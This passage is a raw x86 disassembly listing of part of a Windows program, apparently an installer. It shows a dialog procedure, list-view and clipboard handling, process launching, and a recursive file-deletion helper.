  40579e:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4057a1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4057a4:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4057a7:	50                   	push   %eax
  4057a8:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4057ad:	2b c3                	sub    %ebx,%eax
  4057af:	57                   	push   %edi
  4057b0:	50                   	push   %eax
  4057b1:	ff 75 fc             	push   -0x4(%ebp)
  4057b4:	ff d6                	call   *%esi
  4057b6:	57                   	push   %edi
  4057b7:	ff 75 d4             	push   -0x2c(%ebp)
  4057ba:	68 13 10 00 00       	push   $0x1013
  4057bf:	ff 75 fc             	push   -0x4(%ebp)
  4057c2:	ff d6                	call   *%esi
  4057c4:	3b df                	cmp    %edi,%ebx
  4057c6:	74 0b                	je     0x4057d3
  4057c8:	8b 45 08             	mov    0x8(%ebp),%eax
  4057cb:	66 89 3c 45 28 1f 42 	mov    %di,0x421f28(,%eax,2)
  4057d2:	00 
  4057d3:	5f                   	pop    %edi
  4057d4:	5e                   	pop    %esi
  4057d5:	5b                   	pop    %ebx
  4057d6:	c9                   	leave
  4057d7:	c2 08 00             	ret    $0x8
  4057da:	56                   	push   %esi
  4057db:	8b 35 88 9a 42 00    	mov    0x429a88,%esi
  4057e1:	57                   	push   %edi
  4057e2:	8b 3d 8c 9a 42 00    	mov    0x429a8c,%edi
  4057e8:	6a 00                	push   $0x0
  4057ea:	ff 15 98 82 40 00    	call   *0x408298
  4057f0:	09 05 20 9b 42 00    	or     %eax,0x429b20
  4057f6:	6a 00                	push   $0x0
  4057f8:	e8 50 ee ff ff       	call   0x40464d
  4057fd:	85 ff                	test   %edi,%edi
  4057ff:	74 2b                	je     0x40582c
  405801:	83 c6 0c             	add    $0xc,%esi
  405804:	4f                   	dec    %edi
  405805:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405809:	74 0f                	je     0x40581a
  40580b:	ff 74 24 0c          	push   0xc(%esp)
  40580f:	ff 36                	push   (%esi)
  405811:	e8 73 bb ff ff       	call   0x401389
  405816:	85 c0                	test   %eax,%eax
  405818:	75 0c                	jne    0x405826
  40581a:	81 c6 18 08 00 00    	add    $0x818,%esi
  405820:	85 ff                	test   %edi,%edi
  405822:	75 e0                	jne    0x405804
  405824:	eb 06                	jmp    0x40582c
  405826:	ff 05 ec 9a 42 00    	incl   0x429aec
  40582c:	68 04 04 00 00       	push   $0x404
  405831:	e8 17 ee ff ff       	call   0x40464d
  405836:	ff 15 94 82 40 00    	call   *0x408294
  40583c:	a1 ec 9a 42 00       	mov    0x429aec,%eax
  405841:	5f                   	pop    %edi
  405842:	5e                   	pop    %esi
  405843:	c2 04 00             	ret    $0x4
  405846:	55                   	push   %ebp
  405847:	8b ec                	mov    %esp,%ebp
  405849:	83 ec 40             	sub    $0x40,%esp
  40584c:	53                   	push   %ebx
  40584d:	56                   	push   %esi
  40584e:	8b 35 44 8a 42 00    	mov    0x428a44,%esi
  405854:	33 db                	xor    %ebx,%ebx
  405856:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40585d:	57                   	push   %edi
  40585e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405861:	0f 85 89 01 00 00    	jne    0x4059f0
  405867:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  40586b:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  40586f:	6a 02                	push   $0x2
  405871:	33 c0                	xor    %eax,%eax
  405873:	5e                   	pop    %esi
  405874:	8d 7d e0             	lea    -0x20(%ebp),%edi
  405877:	89 75 c8             	mov    %esi,-0x38(%ebp)
  40587a:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40587d:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  405880:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405883:	ab                   	stos   %eax,%es:(%edi)
  405884:	ab                   	stos   %eax,%es:(%edi)
  405885:	a1 70 9a 42 00       	mov    0x429a70,%eax
  40588a:	8b 3d 3c 82 40 00    	mov    0x40823c,%edi
  405890:	68 03 04 00 00       	push   $0x403
  405895:	8b 48 5c             	mov    0x5c(%eax),%ecx
  405898:	8b 40 60             	mov    0x60(%eax),%eax
  40589b:	ff 75 08             	push   0x8(%ebp)
  40589e:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4058a1:	89 45 10             	mov    %eax,0x10(%ebp)
  4058a4:	ff d7                	call   *%edi
  4058a6:	68 ee 03 00 00       	push   $0x3ee
  4058ab:	a3 30 8a 42 00       	mov    %eax,0x428a30
  4058b0:	ff 75 08             	push   0x8(%ebp)
  4058b3:	ff d7                	call   *%edi
  4058b5:	68 f8 03 00 00       	push   $0x3f8
  4058ba:	a3 28 8a 42 00       	mov    %eax,0x428a28
  4058bf:	ff 75 08             	push   0x8(%ebp)
  4058c2:	ff d7                	call   *%edi
  4058c4:	ff 35 30 8a 42 00    	push   0x428a30
  4058ca:	a3 44 8a 42 00       	mov    %eax,0x428a44
  4058cf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4058d2:	e8 5f ed ff ff       	call   0x404636
  4058d7:	6a 04                	push   $0x4
  4058d9:	e8 b1 f6 ff ff       	call   0x404f8f
  4058de:	a3 34 8a 42 00       	mov    %eax,0x428a34
  4058e3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4058e6:	50                   	push   %eax
  4058e7:	89 1d 4c 8a 42 00    	mov    %ebx,0x428a4c
  4058ed:	ff 75 fc             	push   -0x4(%ebp)
  4058f0:	ff 15 64 82 40 00    	call   *0x408264
  4058f6:	56                   	push   %esi
  4058f7:	ff 15 88 82 40 00    	call   *0x408288
  4058fd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405900:	8b 35 58 82 40 00    	mov    0x408258,%esi
  405906:	2b c8                	sub    %eax,%ecx
  405908:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40590b:	50                   	push   %eax
  40590c:	53                   	push   %ebx
  40590d:	68 61 10 00 00       	push   $0x1061
  405912:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405915:	ff 75 fc             	push   -0x4(%ebp)
  405918:	ff d6                	call   *%esi
  40591a:	b8 00 40 00 00       	mov    $0x4000,%eax
  40591f:	50                   	push   %eax
  405920:	50                   	push   %eax
  405921:	68 36 10 00 00       	push   $0x1036
  405926:	ff 75 fc             	push   -0x4(%ebp)
  405929:	ff d6                	call   *%esi
  40592b:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40592e:	7c 1c                	jl     0x40594c
  405930:	ff 75 0c             	push   0xc(%ebp)
  405933:	53                   	push   %ebx
  405934:	68 01 10 00 00       	push   $0x1001
  405939:	ff 75 fc             	push   -0x4(%ebp)
  40593c:	ff d6                	call   *%esi
  40593e:	ff 75 0c             	push   0xc(%ebp)
  405941:	53                   	push   %ebx
  405942:	68 26 10 00 00       	push   $0x1026
  405947:	ff 75 fc             	push   -0x4(%ebp)
  40594a:	ff d6                	call   *%esi
  40594c:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40594f:	7c 0e                	jl     0x40595f
  405951:	ff 75 10             	push   0x10(%ebp)
  405954:	53                   	push   %ebx
  405955:	68 24 10 00 00       	push   $0x1024
  40595a:	ff 75 fc             	push   -0x4(%ebp)
  40595d:	ff d6                	call   *%esi
  40595f:	8b 45 14             	mov    0x14(%ebp),%eax
  405962:	ff 70 30             	push   0x30(%eax)
  405965:	6a 1b                	push   $0x1b
  405967:	ff 75 08             	push   0x8(%ebp)
  40596a:	e8 92 ec ff ff       	call   0x404601
  40596f:	f6 05 78 9a 42 00 03 	testb  $0x3,0x429a78
  405976:	74 34                	je     0x4059ac
  405978:	53                   	push   %ebx
  405979:	ff 35 30 8a 42 00    	push   0x428a30
  40597f:	ff 15 28 82 40 00    	call   *0x408228
  405985:	f6 05 78 9a 42 00 02 	testb  $0x2,0x429a78
  40598c:	75 0d                	jne    0x40599b
  40598e:	6a 08                	push   $0x8
  405990:	ff 75 fc             	push   -0x4(%ebp)
  405993:	ff 15 28 82 40 00    	call   *0x408228
  405999:	eb 06                	jmp    0x4059a1
  40599b:	89 1d 30 8a 42 00    	mov    %ebx,0x428a30
  4059a1:	ff 35 28 8a 42 00    	push   0x428a28
  4059a7:	e8 8a ec ff ff       	call   0x404636
  4059ac:	68 ec 03 00 00       	push   $0x3ec
  4059b1:	ff 75 08             	push   0x8(%ebp)
  4059b4:	ff d7                	call   *%edi
  4059b6:	68 00 00 30 75       	push   $0x75300000
  4059bb:	8b f8                	mov    %eax,%edi
  4059bd:	53                   	push   %ebx
  4059be:	68 01 04 00 00       	push   $0x401
  4059c3:	57                   	push   %edi
  4059c4:	ff d6                	call   *%esi
  4059c6:	f6 05 78 9a 42 00 04 	testb  $0x4,0x429a78
  4059cd:	0f 84 fc 01 00 00    	je     0x405bcf
  4059d3:	ff 75 10             	push   0x10(%ebp)
  4059d6:	53                   	push   %ebx
  4059d7:	68 09 04 00 00       	push   $0x409
  4059dc:	57                   	push   %edi
  4059dd:	ff d6                	call   *%esi
  4059df:	ff 75 0c             	push   0xc(%ebp)
  4059e2:	53                   	push   %ebx
  4059e3:	68 01 20 00 00       	push   $0x2001
  4059e8:	57                   	push   %edi
  4059e9:	ff d6                	call   *%esi
  4059eb:	e9 df 01 00 00       	jmp    0x405bcf
  4059f0:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4059f7:	75 28                	jne    0x405a21
  4059f9:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4059fc:	50                   	push   %eax
  4059fd:	53                   	push   %ebx
  4059fe:	68 ec 03 00 00       	push   $0x3ec
  405a03:	ff 75 08             	push   0x8(%ebp)
  405a06:	ff 15 3c 82 40 00    	call   *0x40823c
  405a0c:	50                   	push   %eax
  405a0d:	68 da 57 40 00       	push   $0x4057da
  405a12:	53                   	push   %ebx
  405a13:	53                   	push   %ebx
  405a14:	ff 15 84 80 40 00    	call   *0x408084
  405a1a:	50                   	push   %eax
  405a1b:	ff 15 fc 80 40 00    	call   *0x4080fc
  405a21:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405a28:	8b 3d 28 82 40 00    	mov    0x408228,%edi
  405a2e:	75 1c                	jne    0x405a4c
  405a30:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405a36:	75 39                	jne    0x405a71
  405a38:	53                   	push   %ebx
  405a39:	ff 35 30 8a 42 00    	push   0x428a30
  405a3f:	ff d7                	call   *%edi
  405a41:	6a 08                	push   $0x8
  405a43:	56                   	push   %esi
  405a44:	ff d7                	call   *%edi
  405a46:	56                   	push   %esi
  405a47:	e8 ea eb ff ff       	call   0x404636
  405a4c:	33 f6                	xor    %esi,%esi
  405a4e:	46                   	inc    %esi
  405a4f:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  405a56:	75 54                	jne    0x405aac
  405a58:	39 1d 2c 8a 42 00    	cmp    %ebx,0x428a2c
  405a5e:	74 26                	je     0x405a86
  405a60:	6a 78                	push   $0x78
  405a62:	c7 05 18 17 42 00 02 	movl   $0x2,0x421718
  405a69:	00 00 00 
  405a6c:	e8 69 eb ff ff       	call   0x4045da
  405a71:	ff 75 14             	push   0x14(%ebp)
  405a74:	ff 75 10             	push   0x10(%ebp)
  405a77:	ff 75 0c             	push   0xc(%ebp)
  405a7a:	e8 e9 eb ff ff       	call   0x404668
  405a7f:	5f                   	pop    %edi
  405a80:	5e                   	pop    %esi
  405a81:	5b                   	pop    %ebx
  405a82:	c9                   	leave
  405a83:	c2 10 00             	ret    $0x10
  405a86:	6a 08                	push   $0x8
  405a88:	ff 35 68 9a 42 00    	push   0x429a68
  405a8e:	ff d7                	call   *%edi
  405a90:	39 1d ec 9a 42 00    	cmp    %ebx,0x429aec
  405a96:	75 0e                	jne    0x405aa6
  405a98:	a1 20 1f 42 00       	mov    0x421f20,%eax
  405a9d:	53                   	push   %ebx
  405a9e:	ff 70 34             	push   0x34(%eax)
  405aa1:	e8 61 fc ff ff       	call   0x405707
  405aa6:	56                   	push   %esi
  405aa7:	e8 2e eb ff ff       	call   0x4045da
  405aac:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  405ab0:	75 bf                	jne    0x405a71
  405ab2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405ab5:	39 45 10             	cmp    %eax,0x10(%ebp)
  405ab8:	75 b7                	jne    0x405a71
  405aba:	53                   	push   %ebx
  405abb:	53                   	push   %ebx
  405abc:	68 04 10 00 00       	push   $0x1004
  405ac1:	50                   	push   %eax
  405ac2:	ff 15 58 82 40 00    	call   *0x408258
  405ac8:	3b c3                	cmp    %ebx,%eax
  405aca:	89 45 0c             	mov    %eax,0xc(%ebp)
  405acd:	0f 8e fc 00 00 00    	jle    0x405bcf
  405ad3:	ff 15 98 81 40 00    	call   *0x408198
  405ad9:	6a e1                	push   $0xffffffe1
  405adb:	53                   	push   %ebx
  405adc:	8b f8                	mov    %eax,%edi
  405ade:	e8 dc 0b 00 00       	call   0x4066bf
  405ae3:	50                   	push   %eax
  405ae4:	56                   	push   %esi
  405ae5:	53                   	push   %ebx
  405ae6:	57                   	push   %edi
  405ae7:	ff 15 9c 81 40 00    	call   *0x40819c
  405aed:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405af0:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405af4:	c1 e9 10             	shr    $0x10,%ecx
  405af7:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405afb:	0f bf c9             	movswl %cx,%ecx
  405afe:	75 13                	jne    0x405b13
  405b00:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405b03:	50                   	push   %eax
  405b04:	ff 75 fc             	push   -0x4(%ebp)
  405b07:	ff 15 e8 81 40 00    	call   *0x4081e8
  405b0d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405b10:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405b13:	53                   	push   %ebx
  405b14:	ff 75 08             	push   0x8(%ebp)
  405b17:	53                   	push   %ebx
  405b18:	51                   	push   %ecx
  405b19:	50                   	push   %eax
  405b1a:	68 80 01 00 00       	push   $0x180
  405b1f:	57                   	push   %edi
  405b20:	ff 15 a0 81 40 00    	call   *0x4081a0
  405b26:	3b c6                	cmp    %esi,%eax
  405b28:	0f 85 a1 00 00 00    	jne    0x405bcf
  405b2e:	8b 45 0c             	mov    0xc(%ebp),%eax
  405b31:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405b34:	c7 45 d4 48 2f 42 00 	movl   $0x422f48,-0x2c(%ebp)
  405b3b:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  405b42:	89 45 08             	mov    %eax,0x8(%ebp)
  405b45:	bf 73 10 00 00       	mov    $0x1073,%edi
  405b4a:	ff 4d 08             	decl   0x8(%ebp)
  405b4d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405b50:	50                   	push   %eax
  405b51:	ff 75 08             	push   0x8(%ebp)
  405b54:	57                   	push   %edi
  405b55:	ff 75 fc             	push   -0x4(%ebp)
  405b58:	ff 15 58 82 40 00    	call   *0x408258
  405b5e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405b61:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405b65:	75 e3                	jne    0x405b4a
  405b67:	53                   	push   %ebx
  405b68:	ff 15 a4 81 40 00    	call   *0x4081a4
  405b6e:	ff 15 a8 81 40 00    	call   *0x4081a8
  405b74:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405b77:	50                   	push   %eax
  405b78:	6a 42                	push   $0x42
  405b7a:	ff 15 10 81 40 00    	call   *0x408110
  405b80:	50                   	push   %eax
  405b81:	89 45 08             	mov    %eax,0x8(%ebp)
  405b84:	ff 15 88 80 40 00    	call   *0x408088
  405b8a:	8b f0                	mov    %eax,%esi
  405b8c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405b8f:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405b92:	50                   	push   %eax
  405b93:	53                   	push   %ebx
  405b94:	57                   	push   %edi
  405b95:	ff 75 fc             	push   -0x4(%ebp)
  405b98:	ff 15 58 82 40 00    	call   *0x408258
  405b9e:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405ba1:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405ba6:	46                   	inc    %esi
  405ba7:	46                   	inc    %esi
  405ba8:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  405bad:	46                   	inc    %esi
  405bae:	46                   	inc    %esi
  405baf:	43                   	inc    %ebx
  405bb0:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405bb3:	7c d7                	jl     0x405b8c
  405bb5:	ff 75 08             	push   0x8(%ebp)
  405bb8:	ff 15 8c 80 40 00    	call   *0x40808c
  405bbe:	ff 75 08             	push   0x8(%ebp)
  405bc1:	6a 0d                	push   $0xd
  405bc3:	ff 15 ac 81 40 00    	call   *0x4081ac
  405bc9:	ff 15 b0 81 40 00    	call   *0x4081b0
  405bcf:	33 c0                	xor    %eax,%eax
  405bd1:	e9 a9 fe ff ff       	jmp    0x405a7f
  405bd6:	55                   	push   %ebp
  405bd7:	8b ec                	mov    %esp,%ebp
  405bd9:	83 ec 20             	sub    $0x20,%esp
  405bdc:	b8 f0 83 40 00       	mov    $0x4083f0,%eax
  405be1:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405be5:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405be8:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405beb:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405bee:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405bf2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405bf6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405bf9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405bfc:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405c00:	50                   	push   %eax
  405c01:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405c07:	ff 75 08             	push   0x8(%ebp)
  405c0a:	c7 45 f0 e0 83 40 00 	movl   $0x4083e0,-0x10(%ebp)
  405c11:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405c18:	ff 15 7c 80 40 00    	call   *0x40807c
  405c1e:	85 c0                	test   %eax,%eax
  405c20:	74 04                	je     0x405c26
  405c22:	33 c0                	xor    %eax,%eax
  405c24:	eb 06                	jmp    0x405c2c
  405c26:	ff 15 80 80 40 00    	call   *0x408080
  405c2c:	c9                   	leave
  405c2d:	c2 04 00             	ret    $0x4
  405c30:	6a 00                	push   $0x0
  405c32:	ff 74 24 08          	push   0x8(%esp)
  405c36:	ff 15 7c 80 40 00    	call   *0x40807c
  405c3c:	85 c0                	test   %eax,%eax
  405c3e:	74 04                	je     0x405c44
  405c40:	33 c0                	xor    %eax,%eax
  405c42:	eb 06                	jmp    0x405c4a
  405c44:	ff 15 80 80 40 00    	call   *0x408080
  405c4a:	c2 04 00             	ret    $0x4
  405c4d:	6a 06                	push   $0x6
  405c4f:	e8 22 0e 00 00       	call   0x406a76
  405c54:	85 c0                	test   %eax,%eax
  405c56:	74 0a                	je     0x405c62
  405c58:	ff d0                	call   *%eax
  405c5a:	85 c0                	test   %eax,%eax
  405c5c:	74 04                	je     0x405c62
  405c5e:	33 c0                	xor    %eax,%eax
  405c60:	40                   	inc    %eax
  405c61:	c3                   	ret
  405c62:	33 c0                	xor    %eax,%eax
  405c64:	c3                   	ret
  405c65:	55                   	push   %ebp
  405c66:	8b ec                	mov    %esp,%ebp
  405c68:	83 ec 10             	sub    $0x10,%esp
  405c6b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405c6e:	c7 05 50 5f 42 00 44 	movl   $0x44,0x425f50
  405c75:	00 00 00 
  405c78:	50                   	push   %eax
  405c79:	33 c0                	xor    %eax,%eax
  405c7b:	68 50 5f 42 00       	push   $0x425f50
  405c80:	50                   	push   %eax
  405c81:	50                   	push   %eax
  405c82:	68 00 00 00 04       	push   $0x4000000
  405c87:	50                   	push   %eax
  405c88:	50                   	push   %eax
  405c89:	50                   	push   %eax
  405c8a:	ff 75 08             	push   0x8(%ebp)
  405c8d:	50                   	push   %eax
  405c8e:	ff 15 78 80 40 00    	call   *0x408078
  405c94:	85 c0                	test   %eax,%eax
  405c96:	74 0c                	je     0x405ca4
  405c98:	ff 75 f4             	push   -0xc(%ebp)
  405c9b:	ff 15 fc 80 40 00    	call   *0x4080fc
  405ca1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405ca4:	c9                   	leave
  405ca5:	c2 04 00             	ret    $0x4
  405ca8:	8b 44 24 04          	mov    0x4(%esp),%eax
  405cac:	50                   	push   %eax
  405cad:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405cb1:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405cb7:	ff 15 84 81 40 00    	call   *0x408184
  405cbd:	c2 04 00             	ret    $0x4
  405cc0:	ff 25 94 81 40 00    	jmp    *0x408194
  405cc6:	68 00 04 00 00       	push   $0x400
  405ccb:	ff 74 24 0c          	push   0xc(%esp)
  405ccf:	ff 74 24 0c          	push   0xc(%esp)
  405cd3:	ff 35 38 8a 42 00    	push   0x428a38
  405cd9:	ff 15 90 81 40 00    	call   *0x408190
  405cdf:	c2 08 00             	ret    $0x8
  405ce2:	8b 44 24 08          	mov    0x8(%esp),%eax
  405ce6:	8b c8                	mov    %eax,%ecx
  405ce8:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405cee:	83 3d 00 9b 42 00 00 	cmpl   $0x0,0x429b00
  405cf5:	74 05                	je     0x405cfc
  405cf7:	c1 e8 15             	shr    $0x15,%eax
  405cfa:	75 47                	jne    0x405d43
  405cfc:	83 3d 08 9b 42 00 00 	cmpl   $0x0,0x429b08
  405d03:	74 06                	je     0x405d0b
  405d05:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405d0b:	a1 68 9a 42 00       	mov    0x429a68,%eax
  405d10:	68 e0 a3 40 00       	push   $0x40a3e0
  405d15:	a3 e4 a3 40 00       	mov    %eax,0x40a3e4
  405d1a:	a1 60 9a 42 00       	mov    0x429a60,%eax
  405d1f:	a3 e8 a3 40 00       	mov    %eax,0x40a3e8
  405d24:	8b 44 24 08          	mov    0x8(%esp),%eax
  405d28:	a3 ec a3 40 00       	mov    %eax,0x40a3ec
  405d2d:	c7 05 f0 a3 40 00 60 	movl   $0x428a60,0x40a3f0
  405d34:	8a 42 00 
  405d37:	89 0d f4 a3 40 00    	mov    %ecx,0x40a3f4
  405d3d:	ff 15 8c 81 40 00    	call   *0x40818c
  405d43:	c2 08 00             	ret    $0x8
  405d46:	56                   	push   %esi
  405d47:	8b 74 24 08          	mov    0x8(%esp),%esi
  405d4b:	57                   	push   %edi
  405d4c:	56                   	push   %esi
  405d4d:	e8 fb 03 00 00       	call   0x40614d
  405d52:	8b f8                	mov    %eax,%edi
  405d54:	83 ff ff             	cmp    $0xffffffff,%edi
  405d57:	74 2e                	je     0x405d87
  405d59:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405d5e:	56                   	push   %esi
  405d5f:	74 08                	je     0x405d69
  405d61:	ff 15 6c 80 40 00    	call   *0x40806c
  405d67:	eb 06                	jmp    0x405d6f
  405d69:	ff 15 44 81 40 00    	call   *0x408144
  405d6f:	85 c0                	test   %eax,%eax
  405d71:	74 05                	je     0x405d78
  405d73:	33 c0                	xor    %eax,%eax
  405d75:	40                   	inc    %eax
  405d76:	eb 11                	jmp    0x405d89
  405d78:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405d7d:	75 08                	jne    0x405d87
  405d7f:	57                   	push   %edi
  405d80:	56                   	push   %esi
  405d81:	ff 15 d8 80 40 00    	call   *0x4080d8
  405d87:	33 c0                	xor    %eax,%eax
  405d89:	5f                   	pop    %edi
  405d8a:	5e                   	pop    %esi
  405d8b:	c2 08 00             	ret    $0x8
  405d8e:	55                   	push   %ebp
  405d8f:	8b ec                	mov    %esp,%ebp
  405d91:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405d97:	53                   	push   %ebx
  405d98:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405d9b:	56                   	push   %esi
  405d9c:	57                   	push   %edi
  405d9d:	8b 7d 08             	mov    0x8(%ebp),%edi
  405da0:	8b c3                	mov    %ebx,%eax
  405da2:	83 e0 04             	and    $0x4,%eax
  405da5:	57                   	push   %edi
  405da6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405da9:	e8 ab 02 00 00       	call   0x406059
  405dae:	f6 c3 08             	test   $0x8,%bl
  405db1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405db4:	74 17                	je     0x405dcd
  405db6:	57                   	push   %edi
  405db7:	ff 15 44 81 40 00    	call   *0x408144
  405dbd:	f7 d8                	neg    %eax
  405dbf:	1b c0                	sbb    %eax,%eax
  405dc1:	40                   	inc    %eax
  405dc2:	01 05 e8 9a 42 00    	add    %eax,0x429ae8
  405dc8:	e9 7d 01 00 00       	jmp    0x405f4a
  405dcd:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405dd0:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405dd4:	74 11                	je     0x405de7
  405dd6:	85 c0                	test   %eax,%eax
  405dd8:	0f 84 1a 01 00 00    	je     0x405ef8
  405dde:	f6 c3 02             	test   $0x2,%bl
  405de1:	0f 84 11 01 00 00    	je     0x405ef8
  405de7:	be 50 4f 42 00       	mov    $0x424f50,%esi
  405dec:	57                   	push   %edi
  405ded:	56                   	push   %esi
  405dee:	e8 8f 08 00 00       	call   0x406682
  405df3:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405df7:	74 0d                	je     0x405e06
  405df9:	68 9c a5 40 00       	push   $0x40a59c
  405dfe:	56                   	push   %esi
  405dff:	e8 9a 08 00 00       	call   0x40669e
  405e04:	eb 06                	jmp    0x405e0c
  405e06:	57                   	push   %edi
  405e07:	e8 91 01 00 00       	call   0x405f9d
  405e0c:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405e10:	75 0a                	jne    0x405e1c
  405e12:	66 83 3d 50 4f 42 00 	cmpw   $0x5c,0x424f50
  405e19:	5c 
  405e1a:	75 0b                	jne    0x405e27
  405e1c:	68 14 a0 40 00       	push   $0x40a014
  405e21:	57                   	push   %edi
  405e22:	e8 77 08 00 00       	call   0x40669e
  405e27:	57                   	push   %edi
  405e28:	e8 6b 08 00 00       	call   0x406698
  405e2d:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405e30:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405e36:	50                   	push   %eax
  405e37:	56                   	push   %esi
  405e38:	ff 15 40 81 40 00    	call   *0x408140
  405e3e:	8b f0                	mov    %eax,%esi
  405e40:	83 fe ff             	cmp    $0xffffffff,%esi
  405e43:	0f 84 a4 00 00 00    	je     0x405eed
  405e49:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405e50:	2e 
  405e51:	75 1e                	jne    0x405e71
  405e53:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405e5a:	00 
  405e5b:	74 73                	je     0x405ed0
  405e5d:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405e64:	2e 
  405e65:	75 0a                	jne    0x405e71
  405e67:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405e6e:	00 
  405e6f:	74 5f                	je     0x405ed0
  405e71:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405e77:	50                   	push   %eax
  405e78:	53                   	push   %ebx
  405e79:	e8 04 08 00 00       	call   0x406682
  405e7e:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405e85:	74 15                	je     0x405e9c
  405e87:	8b 45 0c             	mov    0xc(%ebp),%eax
  405e8a:	83 e0 03             	and    $0x3,%eax
  405e8d:	3c 03                	cmp    $0x3,%al
  405e8f:	75 3f                	jne    0x405ed0
  405e91:	ff 75 0c             	push   0xc(%ebp)
  405e94:	57                   	push   %edi
  405e95:	e8 f4 fe ff ff       	call   0x405d8e
  405e9a:	eb 34                	jmp    0x405ed0
  405e9c:	ff 75 fc             	push   -0x4(%ebp)
  405e9f:	57                   	push   %edi
  405ea0:	e8 a1 fe ff ff       	call   0x405d46
  405ea5:	85 c0                	test   %eax,%eax
  405ea7:	75 1f                	jne    0x405ec8
  405ea9:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405eac:	74 12                	je     0x405ec0
  405eae:	57                   	push   %edi
  405eaf:	6a f1                	push   $0xfffffff1
  405eb1:	e8 51 f8 ff ff       	call   0x405707
  405eb6:	6a 00                	push   $0x0
  405eb8:	57                   	push   %edi
  405eb9:	e8 84 05 00 00       	call   0x406442
  405ebe:	eb 10                	jmp    0x405ed0
  405ec0:	ff 05 e8 9a 42 00    	incl   0x429ae8
  405ec6:	eb 08                	jmp    0x405ed0
  405ec8:	57                   	push   %edi
  405ec9:	6a f2                	push   $0xfffffff2
  405ecb:	e8 37 f8 ff ff       	call   0x405707
  405ed0:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405ed6:	50                   	push   %eax
  405ed7:	56                   	push   %esi
  405ed8:	ff 15 3c 81 40 00    	call   *0x40813c
  405ede:	85 c0                	test   %eax,%eax
  405ee0:	0f 85 63 ff ff ff    	jne    0x405e49
  405ee6:	56                   	push   %esi
